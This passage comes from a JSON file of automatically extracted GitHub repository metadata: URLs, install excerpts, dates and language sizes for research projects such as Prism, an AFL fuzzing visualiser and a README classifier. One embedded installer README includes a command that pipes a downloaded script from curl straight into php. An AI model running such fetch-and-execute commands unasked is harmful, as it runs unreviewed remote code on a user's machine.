            {
                "result": {
                    "value": "2024-05-29T17:40:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 41660
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "104": {
        "filename": "OpsPAI_Prism_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/OpsPAI/Prism",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Install [python >= 3.8](https://www.python.org/downloads/).\n\n2. Install the dependency needed by Prism with the following command.\n\n\u200b\t\t```pip install -r requirements.txt```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Prism: Revealing Hidden Functional Clusters from Massive Instances in Cloud Systems",
                        "Quick Start"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/OpsPAI/Prism/main/README.MD"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-14T02:33:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-29T06:37:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 24433
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "105": {
        "filename": "AftabHussain_afl-test-viz_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/AftabHussain/FMViz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "**The visualization tool**\n\nIn any directory, clone the repository:\n\n```git clone --recursive git@github.com:AftabHussain/afl-test-viz.git```\n\nBuild and install AFL, patched with the tool\u2019s Test Input\nColor Representation Generator component, as shown below:\n\n```cd afl-test-viz/code/AFL-mut-viz/AFL && make -j32 && make install```\n\n**libxml2**\n\nBuild the test subject (libxml2) with AFL\u2019s\ncompiler (```afl-gcc```), which prepares libxml2 binaries as fuzzing targets. \n\nGet libxml2 as follows in a folder outside ```afl-test-viz``` directory:\n\n```git clone https://github.com/GNOME/libxml2.git && cd libxml2 && git checkout 1fbcf40```\n\nConfigure and build libxml2:\n\n```cd libxml2 && export CC=afl-gcc && ./autogen.sh && make -j32```\n",
                    "type": "Text_excerpt",
                    "original_header": "Environment Setup",
                    "parent_header": [
                        "FMViz",
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/AftabHussain/afl-test-viz/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-07-27T19:40:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-25T22:21:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1354
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "106": {
        "filename": "IBM_Project_CodeNet_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/IBM/Project_CodeNet",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-05-03T02:51:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T20:23:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 509878
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "ANTLR",
                    "name": "ANTLR",
                    "type": "Programming_language",
                    "size": 385094
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 262881
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 209108
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 127045
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 77344
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Awk",
                    "name": "Awk",
                    "type": "Programming_language",
                    "size": 22455
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 20796
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 3946
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "jq",
                    "name": "jq",
                    "type": "Programming_language",
                    "size": 1135
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 563
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "107": {
        "filename": "kristiinara_VulnerabilityPropagationAnalysis_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/kristiinara/VulnerabilityPropagationAnalysis",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-03-16T14:55:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-16T14:57:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 356711
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "108": {
        "filename": "Hynn01_ml-smells_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Hynn01/ml-smells",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img width=\"1024\" alt=\"website\" src=\"https://user-images.githubusercontent.com/26082974/151133966-665d4604-bf12-41b3-8200-647a38d39b45.png\"> \nThe website with all the smells will be published once the double-blind submission requirements are lifted.\n \n",
                    "original_header": "Website"
                },
                "confidence": 0.9642323546546072,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Hynn01/ml-smells/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-25T12:27:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-05T20:46:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 913556
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 19458
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 5879
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "109": {
        "filename": "hrishikeshrt_chanda_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hrishikeshrt/chanda",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "* Install Python requirements using\n\n```pip install -r requirements.txt```\n\n* Copy `settings.sample.py` to `settings.py` and configure settings.\n\n**Note**: OCR systems need to be setup independently.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Chandoj\u00f1\u0101nam"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hrishikeshrt/chanda/master/README.md"
            },
            {
                "result": {
                    "value": "* Link: https://pypi.org/project/google-drive-ocr/\n* Follow setup instructions to setup a project on Google Cloud Platform\n",
                    "type": "Text_excerpt",
                    "original_header": "Google OCR",
                    "parent_header": [
                        "Chandoj\u00f1\u0101nam",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hrishikeshrt/chanda/master/README.md"
            },
            {
                "result": {
                    "value": "* Link: https://github.com/tesseract-ocr/\n* Also install language files for Indian languages such as Sanskrit (`san`), Marathi (`mar`), Hindi (`hin`), Bengali (`ben`), Telugu (`tel`), Tamil (`tam`), Kannada (`kan`), Malayalam (`mal`), Gujarati (`guj`) etc.\n* e.g.,\n```sudo apt install tesseract-ocr-(san|mar|hin|ben|tel|tam|kan|mal|guj)```\n",
                    "type": "Text_excerpt",
                    "original_header": "Tesseract OCR",
                    "parent_header": [
                        "Chandoj\u00f1\u0101nam",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hrishikeshrt/chanda/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Source code for https://sanskrit.iitk.ac.in/jnanasangraha/chanda/\n \n",
                    "original_header": "Chandoj\u00f1\u0101nam"
                },
                "confidence": 0.9469586415309419,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hrishikeshrt/chanda/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-05-03T11:33:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-12T12:42:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 521328
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 54814
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 45765
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 417
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "110": {
        "filename": "gprana_READMEClassifier_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/gprana/READMEClassifier",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# KidsRuby Installer\n\nKidsRuby Installer\n\n## Overview\n\nThis project builds an installer for the KidsRuby project http://kidsruby.com/\n\nThis project is entirely based on RailsInstaller (http://railsinstaller.org)\nwith additions for the kids ruby codebase.\n\n## How to Contribute\n\nKidsRuby Installer is bootstrapped, built and packaged via rake tasks.\n\n1. Download and install the latest RailsInstaller from\n   http://railsinstaller.org/\n\n2. Bootstrap the project, from the project root run\n\n  > rake bootstrap\n\n3. Install latest Inno Setup Quick Start Pack, ensure iscc.exe is in your PATH\n\n   http://www.jrsoftware.org/isdl.php#qsp\n\n4. [[ hackety hack... ]]\n\n5. Download and build all components on the stage\n\n  > rake build\n\n6. Use Inno Setup to package KidsRubyInstaller\n\n  > rake package\n\n7. Use the generated KidsRubyInstaller.exe, be happy and prosperous! Be\n   sure to share it with all of your friends!\n\n### Releasing a new version\n\n1. Update VERSION.txt\n\n2. Update CHANGELOG.txt\n\n### Development Kit (DevKit)\n\nA MSYS/MinGW based toolkit that enables KidsRuby Installer to build native C/C++\npackages, both for Ruby and gems. DevKit is built and maintained by the\nwonderful folks over at the RubyInstaller (http://rubyinstaller.org/) project.\n\n### Ruby 1.9.2 on Windows\n\nKidsRuby Installer is a self contained package installer which installs Ruby and\nRubyGems on a windows system, head over to http://rubyinstaller.org/ for more\ninformation.\n\n### Packaging/Installer\n\nWe are using [Inno Setup](http://www.jrsoftware.org/isinfo.php \"Inno Setup\"),\na free installer for Windows programs.\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/gprana/READMEClassifier/master/input/dev_and_eval_readmes/gkarunakaran.kidsrubyinstaller-windows.md"
            },
            {
                "result": {
                    "value": "The Puli Installer\n==================\n\n[![Build Status](https://travis-ci.org/puli/installer.svg?branch=master)](https://travis-ci.org/puli/installer)\n[![Build status](https://ci.appveyor.com/api/projects/status/56vtn91rphj8vo67/branch/master?svg=true)](https://ci.appveyor.com/project/webmozart/installer/branch/master)\n[![Scrutinizer Code Quality](https://scrutinizer-ci.com/g/puli/installer/badges/quality-score.png?b=master)](https://scrutinizer-ci.com/g/puli/installer/?branch=master)\n[![Latest Stable Version](https://poser.pugx.org/puli/installer/v/stable.svg)](https://packagist.org/packages/puli/installer)\n[![Total Downloads](https://poser.pugx.org/puli/installer/downloads.svg)](https://packagist.org/packages/puli/installer)\n[![Dependency Status](https://www.versioneye.com/php/puli:installer/1.0.0/badge.svg)](https://www.versioneye.com/php/puli:installer/1.0.0)\n\nLatest release: none\n\nPHP >= 5.3.9\n\nInstalls `puli.phar` on your system. Use it like this:\n\n```\n$ curl https://puli.io/installer | php\n```\n\nAuthors\n-------\n\n* [Bernhard Schussek] a.k.a. [@webmozart]\n* [The Community Contributors]\n\nContribute\n----------\n\nContributions to are very welcome!\n\n* Report any bugs or issues you find on the [issue tracker].\n* You can grab the source code at Puli\u2019s [Git repository].\n\nSupport\n-------\n\nIf you are having problems, send a mail to bschussek@gmail.com or shout out to\n[@webmozart] on Twitter.\n\nLicense\n-------\n\nAll contents of this package are licensed under the [MIT license].\n\n[Bernhard Schussek]: http://webmozarts.com\n[The Community Contributors]: https://github.com/puli/installer/graphs/contributors\n[issue tracker]: https://github.com/puli/issues/issues\n[Git repository]: https://github.com/puli/installer\n[@webmozart]: https://twitter.com/webmozart\n[MIT license]: LICENSE\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/gprana/READMEClassifier/master/input/dev_and_eval_readmes/EmanueleMinotto.installer.md"
            },
            {
                "result": {
                    "value": "This project is written in Python 3. It also uses SQLite to store intermediary data during processing. By default the database is  `database/data.db`.\n\nThe code requires creation of some directories for logging and temporary file storage. Please create these prior to running the scripts:\n1. `log/`\n2. `temp/abstracted_markdown/`\n3. `temp/abstracted_html/`\n4. `temp/target_abstracted_markdown/`\n\nIf you want to train a model using provided dataset to predict labels in new file that's not in the set, you'll also need to create the following directories:\n\n5. `model/`. Used by `classifier_train_model.py` to save result of training. `classifier_classify_target.py` loads model saved in this directory for classifying sections in user-provided README file.\n6. `input/clf_target_readmes/`. The default place to store README files whose section labels are to be predicted.\n7. `output/`. Used by `classifier_classify_target.py` saves its resulting labels here.\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "GitHub README Content Classifier"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/gprana/READMEClassifier/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-05-21T04:15:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-21T08:42:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 131794
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "111": {
        "filename": "consult-kcl_fhir-ehr-adapter_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/kclconsult/ehr-fhir-converter",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Run setup tools from the root directory:\n\n```\npython setup.py sdist bdist_wheel\n```\n\nGiven a certain release, either available in ``dist/`` if built, or via Github, install as follows:\n\n```\npython setup.py install\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install as package",
                    "parent_header": [
                        "EHR-FHIR Converter"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/consult-kcl/fhir-ehr-adapter/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Build these containers:\n```\ndocker-compose build\n```\nRun these containers:\n```\ndocker-compose up -d\n```\n(Optional) Run without queue:\n```\ndocker-compose up --scale webapp-queue=0 rabbit=0\n```\n \n",
                    "original_header": "Deployment"
                },
                "confidence": 0.9817946320192527,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/consult-kcl/fhir-ehr-adapter/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We use [SemVer](http://semver.org/) for versioning. For the versions available, see the [tags on this repository](https://github.com/martinchapman/nokia-health/tags).\n \n",
                    "original_header": "Versioning"
                },
                "confidence": 0.9351360543374216,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/consult-kcl/fhir-ehr-adapter/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-02-16T11:33:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-02T04:03:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 95683
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 5314
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 272
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "112": {
        "filename": "Spirals-Team_test4repair-experiments_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Spirals-Team/test4repair-experiments",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2016-09-30T12:28:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-12-02T06:29:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 137185443
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 200793
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 122234
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "113": {
        "filename": "sharmalab_bindaas_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sharmalab/bindaas",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To verify everything is setup correctly visit the following url in your web-browser :\nhttp://localhost:8080/dashboard/\n\nYou should be greeted by Bindaas Login page.\n\nThe logs can be found at <BINDAAS-BINARY-HOME>/log/bindaas.log.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Verify Setup",
                    "parent_header": [
                        "Bindaas Data Access Federation Middleware"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sharmalab/bindaas/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`$ mvn clean install` \nBindaas does not build with JDK 10, due to incompatibilities in Maven plugins. \n",
                    "original_header": "Building Bindaas"
                },
                "confidence": 0.9941924953548903,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sharmalab/bindaas/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you encounter the error \"java.net.SocketException: Can't assign requested address\" followed by a few\nCXF errors when you are on a Mac with a wireless connection, please use the flag \"-Djava.net.preferIPv4Stack=true\" to fix this,\nas shown below: \n",
                    "original_header": "Troubleshooting"
                },
                "confidence": 0.9998762123139272,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sharmalab/bindaas/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-06-09T16:01:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-26T10:45:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 3403543
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 512083
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 214460
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "XSLT",
                    "name": "XSLT",
                    "type": "Programming_language",
                    "size": 114652
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 56242
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 14035
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 6773
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1990
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 545
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 350
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "114": {
        "filename": "awsm-research_line-level-defect-prediction_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/awsm-research/line-level-defect-prediction",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "https://github.com/awsm-research/line-level-defect-prediction \n",
                    "original_header": "Research Artifact: Predicting Defective Lines Using a Model-Agnostic Technique"
                },
                "confidence": 0.9019311303744101,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/awsm-research/line-level-defect-prediction/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-08-06T05:28:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-06T10:09:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "115": {
        "filename": "SEALABQualityGroup_replication_delag_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SEALABQualityGroup/replication_delag",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Requirements**\n- Python 3.6\n- Java 8\n- Apache Spark 2.3.1 (set `$SPARK_HOME` env variable with the folder path))\n- Elasticsearch for Spark 2.X 7.6.0 (set `$ES_SPARK` env variable with the jar path)\n- Maven 3.6.0 (only for datasets generation)\n- Docker 18.03 (only for datasets generation) \nUse the following command to install Python dependencies\n```\npip install --upgrade pip\npip install -r requirements.txt\n``` \n",
                    "original_header": "DeLag: Using Multi-Objective Optimization to Enhance the Detection of Latency Degradation Patterns in Service-based Systems"
                },
                "confidence": 0.9999999912874955,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SEALABQualityGroup/replication_delag/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-12-28T17:14:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-03-24T09:27:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "116": {
        "filename": "mauricioms_results-generated-with-chatgpt_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mauricioms/results-generated-with-chatgpt",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-10-20T11:57:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-20T12:06:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1142555
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vue",
                    "name": "Vue",
                    "type": "Programming_language",
                    "size": 43250
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 41735
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 5496
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 1755
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 602
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 91
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "117": {
        "filename": "winiars_meros_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/twiniars/MeROS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n<img src=\"https://github.com/twiniars/MeROS/blob/main/meros-graphical-abstract.png\"> \n</p>\n \n",
                    "original_header": "MeROS: SysML-based Metamodel for ROS-related Systems"
                },
                "confidence": 0.9953236700072952,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/twiniars/meros/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* User feedback and contribution is welcome with issues https://github.com/twiniars/MeROS/issues \n",
                    "original_header": "Contribution"
                },
                "confidence": 0.998300046373744,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/twiniars/meros/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-07T18:33:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T09:49:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 121298
